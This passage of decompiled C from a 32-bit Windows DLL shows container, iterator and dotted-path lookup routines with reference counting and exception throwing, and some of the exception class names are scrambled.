  LOBYTE(v10) = 1;
  sub_1000BA51(v8);
  LOBYTE(v10) = 0;
  sub_10009F65(&a3);
  return a2;
}
// 100223E4: using guessed type _DWORD var_28[2];

//----- (10022475) --------------------------------------------------------
_DWORD *__stdcall sub_10022475(_DWORD *a1, _DWORD *a2, int a3, int a4)
{
  int *v4; // eax
  _DWORD v6[2]; // [esp+10h] [ebp-28h] BYREF
  int v7[2]; // [esp+18h] [ebp-20h] BYREF
  int v8[2]; // [esp+20h] [ebp-18h] BYREF
  int v9; // [esp+28h] [ebp-10h]
  int v10; // [esp+34h] [ebp-4h]

  v9 = 0;
  v10 = 1;
  sub_1000BA21(v8, (int)&a3);
  LOBYTE(v10) = 2;
  sub_1002229A(v6, 0);
  LOBYTE(v10) = 3;
  v4 = sub_10022507(a1, v7, (int)v8, 1, 0);
  LOBYTE(v10) = 4;
  sub_10023F44(v4, a2);
  v9 = 1;
  LOBYTE(v10) = 3;
  sub_100027E6(v7);
  LOBYTE(v10) = 2;
  sub_1000DC9E(v6);
  LOBYTE(v10) = 1;
  sub_1000BA51(v8);
  LOBYTE(v10) = 0;
  sub_10009F65(&a3);
  return a2;
}
// 10022475: using guessed type _DWORD var_28[2];

//----- (10022507) --------------------------------------------------------
_DWORD *__thiscall sub_10022507(_DWORD *this, _DWORD *a2, int a3, int a4, int MaxCount)
{
  _DWORD *v6; // edi
  int *v7; // eax
  int v8; // esi
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  int v12[2]; // [esp+10h] [ebp-30h] BYREF
  int v13[2]; // [esp+18h] [ebp-28h] BYREF
  int v14[2]; // [esp+20h] [ebp-20h] BYREF
  int v15; // [esp+28h] [ebp-18h] BYREF
  volatile LONG *v16; // [esp+2Ch] [ebp-14h]
  int v17; // [esp+30h] [ebp-10h]
  int v18; // [esp+3Ch] [ebp-4h]
  int MaxCounta; // [esp+54h] [ebp+14h]

  MaxCounta = sub_1000A974(MaxCount, a3, 0x2Eu);
  sub_100027A6(a2);
  v18 = 0;
  v17 = 1;
  if ( MaxCounta == -1 )
  {
    sub_10009F32(&v15, a3);
    v18 = 1;
    if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, int *))(this[4] + 8))(this + 4, &v15) )
    {
      v6 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int *))(this[4] + 20))(this + 4, &v15);
      sub_10023799(a2, v6);
    }
    LOBYTE(v18) = 0;
    sub_10009F65(&v15);
  }
  else
  {
    sub_1000A3E9(a3, 0, v14, MaxCounta);
    v18 = 2;
    if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, int *))(this[4] + 8))(this + 4, v14) )
    {
      v7 = (int *)(*(int (__thiscall **)(_DWORD *, int *))(this[4] + 20))(this + 4, v14);
      v16 = (volatile LONG *)v7[1];
      v15 = *v7;
      v8 = v15;
      InterlockedIncrement(v16);
      LOBYTE(v18) = 3;
      if ( (*(int (__thiscall **)(int))(*(_DWORD *)v8 + 8))(v8) == 2 )
      {
        sub_10022222(v12);
        LOBYTE(v18) = 4;
        sub_10023F0B(&v15, v13);
        LOBYTE(v18) = 6;
        sub_1000DBA8(v12);
        v9 = (_DWORD *)sub_10022507((int)v12, a3, a4, MaxCounta + 1);
        LOBYTE(v18) = 7;
        sub_10023799(a2, v9);
        LOBYTE(v18) = 6;
        sub_100027E6(v12);
        LOBYTE(v18) = 3;
        sub_1000DBA8(v13);
      }
      LOBYTE(v18) = 2;
      sub_100027E6(&v15);
    }
    LOBYTE(v18) = 0;
    sub_10009F65(v14);
  }
  if ( *a2 && a4 && (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*a2 + 8))(*a2) != a4 )
  {
    v10 = sub_100027A6(v12);
    v18 = 8;
    sub_10023799(a2, v10);
    LOBYTE(v18) = 0;
    sub_100027E6(v12);
  }
  return a2;
}

//----- (100226A2) --------------------------------------------------------
bool __stdcall sub_100226A2(_DWORD *a1, int a2, int a3, int a4)
{
  _DWORD *v4; // eax
  int v6[2]; // [esp+10h] [ebp-20h] BYREF
  int v7[5]; // [esp+18h] [ebp-18h] BYREF
  int v8; // [esp+2Ch] [ebp-4h]
  bool v9; // [esp+3Fh] [ebp+Fh]

  v8 = 0;
  sub_1000BA21(v7, (int)&a3);
  LOBYTE(v8) = 1;
  v4 = sub_10022507(a1, v6, (int)v7, a2, 0);
  LOBYTE(v8) = 2;
  v9 = *v4 != 0;
  LOBYTE(v8) = 1;
  sub_100027E6(v6);
  LOBYTE(v8) = 0;
  sub_1000BA51(v7);
  v8 = -1;
  sub_10009F65(&a3);
  return v9;
}

//----- (10022712) --------------------------------------------------------
int __thiscall sub_10022712(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[4] + 44))(this + 4, a2);
  return a2;
}

//----- (10022743) --------------------------------------------------------
void __thiscall sub_10022743(_DWORD *this, int a2, int *a3, int a4)
{
  int v5; // eax
  _DWORD *v6; // ebx
  _DWORD *v7; // edi
  _DWORD *v8; // eax
  _DWORD *v9; // ebx
  _DWORD *v10; // eax
  _DWORD *v11; // edi
  _DWORD *v12; // eax
  void **v13; // ecx
  int v14; // eax
  _DWORD *v15; // eax
  int v16; // [esp-Ch] [ebp-50h]
  int v17; // [esp-8h] [ebp-4Ch] BYREF
  int v18; // [esp-4h] [ebp-48h]
  _DWORD *pExceptionObject[2]; // [esp+10h] [ebp-34h] BYREF
  int v20; // [esp+18h] [ebp-2Ch]
  void *v21; // [esp+1Ch] [ebp-28h] BYREF
  volatile LONG *v22; // [esp+20h] [ebp-24h]
  int v23[2]; // [esp+24h] [ebp-20h] BYREF
  int v24[3]; // [esp+2Ch] [ebp-18h] BYREF
  int v25; // [esp+40h] [ebp-4h]

  v5 = sub_1000A974(a4, a2, 0x2Eu);
  v20 = v5;
  if ( v5 == -1 )
  {
    sub_10009F32(v24, a2);
    v25 = 0;
    v6 = this + 4;
    if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, int *))(this[4] + 8))(this + 4, v24) )
      goto LABEL_3;
    sub_100027A6(&v21);
    LOBYTE(v25) = 1;
    v7 = sub_10023F7D(a3, v23);
    LOBYTE(v25) = 2;
    v8 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int *))(*v6 + 16))(v6, v24);
    sub_10023799(v8, v7);
    LOBYTE(v25) = 1;
    sub_100027E6(v23);
    LOBYTE(v25) = 0;
    sub_100027E6(&v21);
  }
  else
  {
    sub_1000A3E9(a2, 0, v24, v5);
    v25 = 3;
    sub_10022222(v23);
    LOBYTE(v25) = 4;
    v9 = this + 4;
    if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, int *))(this[4] + 8))(this + 4, v24) )
    {
      v14 = (*(int (__thiscall **)(_DWORD *, int *))(*v9 + 16))(this + 4, v24);
      v22 = *(volatile LONG **)(v14 + 4);
      v21 = *(void **)v14;
      InterlockedIncrement(v22);
      LOBYTE(v25) = 9;
      if ( (*(int (__thiscall **)(void *))(*(_DWORD *)v21 + 8))(v21) == 1 )
      {
LABEL_3:
        sub_1000E15A(pExceptionObject);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
      }
      v15 = sub_10023F0B((int *)&v21, pExceptionObject);
      LOBYTE(v25) = 10;
      sub_1000DBD3(v23, v15);
      LOBYTE(v25) = 9;
      sub_1000DBA8(pExceptionObject);
      LOBYTE(v25) = 4;
      v13 = &v21;
    }
    else
    {
      pExceptionObject[0] = operator new(0x34u);
      LOBYTE(v25) = 5;
      if ( pExceptionObject[0] )
      {
        v17 = v18;
        v21 = &v17;
        sub_10009F32(&v17, (int)v24);
        LOBYTE(v25) = 6;
        v16 = this[3];
        LOBYTE(v25) = 5;
        v10 = sub_10022338(pExceptionObject[0], v16, v17, v18);
      }
      else
      {
        v10 = 0;
      }
      LOBYTE(v25) = 4;
      sub_100222D9(v23, (int)v10);
      sub_100027A6(pExceptionObject);
      LOBYTE(v25) = 7;
      v11 = sub_10023FB6(v23, &v21);
      LOBYTE(v25) = 8;
      v12 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int *))(*v9 + 16))(v9, v24);
      sub_10023799(v12, v11);
      LOBYTE(v25) = 7;
      sub_100027E6(&v21);
      LOBYTE(v25) = 4;
      v13 = (void **)pExceptionObject;
    }
    sub_100027E6(v13);
    sub_10022743(a2, a3, v20 + 1);
    LOBYTE(v25) = 3;
    sub_1000DBA8(v23);
  }
  v25 = -1;
  sub_10009F65(v24);
}

//----- (100229BB) --------------------------------------------------------
int __thiscall sub_100229BB(_DWORD *this)
{
  _DWORD *v1; // esi
  int v2; // ebx
  unsigned int i; // edi
  _DWORD *v4; // eax
  int v6; // [esp+14h] [ebp-20h] BYREF
  unsigned int v7; // [esp+18h] [ebp-1Ch]
  int v8; // [esp+30h] [ebp-4h]

  v1 = this + 4;
  v2 = 0;
  (*(void (__thiscall **)(_DWORD *, int *))(this[4] + 48))(this + 4, &v6);
  v8 = 0;
  for ( i = 0; i < v7; ++i )
  {
    v4 = (_DWORD *)(*(int (__thiscall **)(int *, unsigned int))(v6 + 44))(&v6, i);
    v2 += (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*v4 + 4))(*v4);
  }
  (*(void (__thiscall **)(_DWORD *))(*v1 + 24))(v1);
  v8 = -1;
  sub_1002380E(&v6);
  return v2;
}

//----- (10022A4A) --------------------------------------------------------
int __thiscall sub_10022A4A(_DWORD *this, int pExceptionObject, int a3)
{
  int v4; // esi
  int v5; // edi
  _DWORD *v6; // esi
  _DWORD *v8; // eax
  int v9; // edi
  _DWORD *v10; // ebx
  _DWORD *v11; // eax
  int *v12; // eax
  int v13[2]; // [esp+10h] [ebp-28h] BYREF
  int v14[2]; // [esp+18h] [ebp-20h] BYREF
  int v15; // [esp+20h] [ebp-18h] BYREF
  _DWORD *v16; // [esp+24h] [ebp-14h]
  int v17; // [esp+34h] [ebp-4h]

  v16 = this;
  v4 = pExceptionObject;
  v5 = sub_1000A974(a3, pExceptionObject, 0x2Eu);
  if ( v5 == -1 )
  {
    sub_10009F32(v14, v4);
    v17 = 0;
    v6 = this + 4;
    if ( !(*(unsigned __int8 (__thiscall **)(_DWORD *, int *))(this[4] + 8))(this + 4, v14) )
    {
LABEL_3:
      v17 = -1;
      sub_10009F65(v14);
      return 0;
    }
    v8 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int *))(*v6 + 16))(this + 4, v14);
    v9 = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*v8 + 4))(*v8);
    (*(void (__thiscall **)(_DWORD *, int *))(*v6 + 12))(this + 4, v14);
  }
  else
  {
    sub_1000A3E9(v4, 0, v14, v5);
    v17 = 1;
    v10 = v16 + 4;
    if ( !(*(unsigned __int8 (__thiscall **)(_DWORD *, int *))(v16[4] + 8))(v16 + 4, v14) )
      goto LABEL_3;
    v11 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int *))(*v10 + 16))(v10, v14);
    if ( (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*v11 + 8))(*v11) != 2 )
    {
      sub_1000E15A(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
    }
    sub_10022222(&v15);
    LOBYTE(v17) = 2;
    v12 = (int *)(*(int (__thiscall **)(_DWORD *, int *))(*v10 + 16))(v10, v14);
    sub_10023F0B(v12, v13);
    LOBYTE(v17) = 4;
    sub_1000DBA8(&v15);
    v9 = sub_10022A4A(pExceptionObject, v5 + 1);
    if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)(v13[0] + 16) + 28))(v13[0] + 16) )
      (*(void (__thiscall **)(_DWORD *, int *))(*v10 + 12))(v10, v14);
    LOBYTE(v17) = 1;
    sub_1000DBA8(v13);
  }
  v17 = -1;
  sub_10009F65(v14);
  return v9;
}

//----- (10022B93) --------------------------------------------------------
int sub_10022B93()
{
  return 2;
}

//----- (10022B97) --------------------------------------------------------
int __thiscall sub_10022B97(int this, int a2)
{
  sub_10007865((void *)(this + 4), a2);
  return a2;
}

//----- (10022BC8) --------------------------------------------------------
int __thiscall sub_10022BC8(int this, int a2)
{
  sub_10023201((void *)(this + 20), a2);
  return a2;
}

//----- (10022BF9) --------------------------------------------------------
_DWORD *__thiscall sub_10022BF9(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x20u);
  if ( v3 )
    v4 = sub_10023273(v3, (int)this);
  else
    v4 = 0;
  sub_10024073(a2, (int)v4);
  return a2;
}

//----- (10022C49) --------------------------------------------------------
void __thiscall sub_10022C49(_DWORD *this)
{
  *this = &off_10074360;
  *this = off_10072944;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 10074360: using guessed type int (__thiscall *off_10074360)(void *Block, char);

//----- (10022C6E) --------------------------------------------------------
BOOL __thiscall sub_10022C6E(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (10022C87) --------------------------------------------------------
_DWORD *__thiscall sub_10022C87(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_10023386(this, v3, 0);
  else
    v4 = 0;
  sub_100240F1(a2, (int)v4);
  return a2;
}

//----- (10022CDA) --------------------------------------------------------
_DWORD *__thiscall sub_10022CDA(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_100234F0(this, v3, 0);
  else
    v4 = 0;
  sub_10024003(a2, (int)v4);
  return a2;
}

//----- (10022D2D) --------------------------------------------------------
_DWORD *__thiscall sub_10022D2D(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+14h] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_10023386(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_100240F1(a2, (int)v4);
  return a2;
}

//----- (10022D88) --------------------------------------------------------
_DWORD *__thiscall sub_10022D88(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+14h] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_100234F0(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10024003(a2, (int)v4);
  return a2;
}

//----- (10022DE3) --------------------------------------------------------
_DWORD *__thiscall sub_10022DE3(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_10023386(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_100240F1(a2, (int)v6);
  return a2;
}

//----- (10022E58) --------------------------------------------------------
_DWORD *__thiscall sub_10022E58(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_100234F0(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10024003(a2, (int)v6);
  return a2;
}

//----- (10022ECD) --------------------------------------------------------
void __thiscall sub_10022ECD(_DWORD *this)
{
  *this = &off_1007442C;
  *this = off_10072944;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 1007442C: using guessed type int (__thiscall *off_1007442C)(void *Block, char);

//----- (10022EF2) --------------------------------------------------------
int *__thiscall sub_10022EF2(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10023234(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 10022F48: variable 'v5' is possibly undefined

//----- (10022F5A) --------------------------------------------------------
int *__thiscall sub_10022F5A(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_100231D0(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 10022FB0: variable 'v5' is possibly undefined

//----- (10022FC2) --------------------------------------------------------
void __thiscall sub_10022FC2(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10024130(v2);
}

//----- (10022FFA) --------------------------------------------------------
void __thiscall sub_10022FFA(void *this, int a2, int a3)
{
  int v3[4]; // [esp+10h] [ebp-14h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10024130(v3);
}

//----- (10023035) --------------------------------------------------------
void __thiscall sub_10023035(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10024130(v2);
}

//----- (1002306D) --------------------------------------------------------
int __thiscall sub_1002306D(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10024042(v4);
  return v2;
}

//----- (100230A9) --------------------------------------------------------
int __thiscall sub_100230A9(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10024130(v4);
  return v2;
}

//----- (100230E5) --------------------------------------------------------
void __thiscall sub_100230E5(void *this)
{
  int v1[4]; // [esp+10h] [ebp-14h] BYREF
  int v2; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10024130(v1);
}

//----- (1002312D) --------------------------------------------------------
_DWORD *__thiscall sub_1002312D(_DWORD *Block, char a2)
{
  sub_10022C49(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002314C) --------------------------------------------------------
_DWORD *__thiscall sub_1002314C(_DWORD *Block, char a2)
{
  *Block = &off_10074390;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10074390: using guessed type int (__thiscall *off_10074390)(void *Block, char);

//----- (1002316C) --------------------------------------------------------
_DWORD *__thiscall sub_1002316C(_DWORD *Block, char a2)
{
  *Block = &off_100743B0;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 100743B0: using guessed type int (__thiscall *off_100743B0)(void *Block, char);

//----- (1002318C) --------------------------------------------------------
_DWORD *__thiscall sub_1002318C(_DWORD *Block, char a2)
{
  sub_10022ECD(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100231AB) --------------------------------------------------------
_DWORD *__thiscall sub_100231AB(_DWORD *Block, char a2)
{
  *Block = &off_10074464;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10074464: using guessed type int (__thiscall *off_10074464)(void *Block, char);

//----- (100231D0) --------------------------------------------------------
int __usercall sub_100231D0@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10023201) --------------------------------------------------------
int __thiscall sub_10023201(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, a2);
  return a2;
}

//----- (10023234) --------------------------------------------------------
int __usercall sub_10023234@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10023273) --------------------------------------------------------
_DWORD *__stdcall sub_10023273(_DWORD *a1, int a2)
{
  *a1 = &off_10074390;
  a1[1] = a2;
  *a1 = &off_10074484;
  sub_10023728(a1 + 2);
  a1[7] = 0;
  return a1;
}
// 10074390: using guessed type int (__thiscall *off_10074390)(void *Block, char);
// 10074484: using guessed type int (__thiscall *off_10074484)(void *Block, char);

//----- (100232B7) --------------------------------------------------------
BOOL __thiscall sub_100232B7(int this)
{
  return *(_DWORD *)(this + 28) >= (unsigned int)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (100232CA) --------------------------------------------------------
BOOL __thiscall sub_100232CA(_DWORD *this)
{
  return this[7] != 0;
}

//----- (100232D4) --------------------------------------------------------
int *__thiscall sub_100232D4(int *this)
{
  int v2; // eax
  _DWORD *v3; // eax

  v2 = (*(int (__thiscall **)(int, int))(*(_DWORD *)(this[1] + 4) + 44))(this[1] + 4, this[7]);
  sub_100021B1((int *)(v2 + 4), this + 4);
  v3 = (_DWORD *)(*(int (__thiscall **)(int, int))(*(_DWORD *)(this[1] + 20) + 44))(this[1] + 20, this[7]);
  sub_10023799(this + 5, v3);
  return this + 2;
}

//----- (1002330F) --------------------------------------------------------
void __thiscall sub_1002330F(_DWORD *this)
{
  ++this[7];
}

//----- (10023313) --------------------------------------------------------
void __thiscall sub_10023313(_DWORD *this)
{
  --this[7];
}

//----- (10023317) --------------------------------------------------------
void __noreturn sub_10023317()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_1000E1AC(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 10023317: using guessed type void __noreturn sub_10023317();
// 10023317: using guessed type _DWORD pExceptionObject[2];

//----- (10023334) --------------------------------------------------------
void __noreturn sub_10023334()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_1000E1AC(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 10023334: using guessed type void __noreturn sub_10023334();
// 10023334: using guessed type _DWORD pExceptionObject[2];

//----- (10023351) --------------------------------------------------------
void __thiscall sub_10023351(int *this)
{
  *this = (int)off_1007438C;
  sub_100027E6(this + 3);
  sub_10009F65(this + 1);
}
// 1007438C: using guessed type int (__thiscall *off_1007438C[2])(void *Block, char);

//----- (10023386) --------------------------------------------------------
_DWORD *__thiscall sub_10023386(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10074464;
  a2[1] = this;
  *a2 = &off_100744A4;
  a2[2] = a3;
  return result;
}
// 10074464: using guessed type int (__thiscall *off_10074464)(void *Block, char);
// 100744A4: using guessed type int (__thiscall *off_100744A4)(void *Block, char);

//----- (100233BA) --------------------------------------------------------
void __thiscall sub_100233BA(_DWORD *this)
{
  *this = &off_100744A4;
  *this = &off_10074464;
}
// 10074464: using guessed type int (__thiscall *off_10074464)(void *Block, char);
// 100744A4: using guessed type int (__thiscall *off_100744A4)(void *Block, char);

//----- (100233DF) --------------------------------------------------------
bool __thiscall sub_100233DF(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (100233F6) --------------------------------------------------------
BOOL __thiscall sub_100233F6(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10023400) --------------------------------------------------------
int __thiscall sub_10023400(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1002343B) --------------------------------------------------------
int __thiscall sub_1002343B(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (10023471) --------------------------------------------------------
int __thiscall sub_10023471(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (10023499) --------------------------------------------------------
int __thiscall sub_10023499(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (100234D4) --------------------------------------------------------
int __thiscall sub_100234D4(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (100234F0) --------------------------------------------------------
_DWORD *__thiscall sub_100234F0(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_100743B0;
  a2[1] = this;
  *a2 = &off_100744C4;
  a2[2] = a3;
  return result;
}
// 100743B0: using guessed type int (__thiscall *off_100743B0)(void *Block, char);
